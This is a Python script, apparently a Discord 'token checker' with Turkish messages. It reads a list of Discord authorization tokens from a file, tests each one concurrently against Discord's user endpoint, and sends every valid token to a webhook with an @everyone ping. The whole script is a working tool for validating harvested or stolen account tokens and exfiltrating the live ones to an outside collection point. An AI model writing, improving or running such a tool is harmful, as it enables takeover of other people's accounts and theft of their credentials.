import requests
import random
from colorama import Fore, init as colorama_init
import threading
from discord_webhook import DiscordWebhook

print(f"{Fore.RED}BEXİ TOKEN CHECKER V1.0 {Fore.RESET}")

webhook_url = "your webhook token"

max_attempts = 100000

def check_token(token):
    try:
        headers = {'Authorization': token}
        response = requests.get('https://canary.discord.com/api/v7/users/@me', headers=headers)
        if response.status_code == 200: 
            print(f"{Fore.WHITE}Token Found: {token}")
            webhook = DiscordWebhook(url=webhook_url, content=f"@everyone Token Found : {token}")
            response = webhook.execute()
    except:
        pass

def main():
    with open("token.txt", "r") as file:
        tokens = file.readlines()
    
    threads = []
    for attempt, token in enumerate(tokens, start=1):
        token = token.strip()
        print(f"{Fore.GREEN}Deneme {attempt} Denenen Token: {token}")
        thread = threading.Thread(target=check_token, args=(token,))
        threads.append(thread)
        thread.start()
        
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
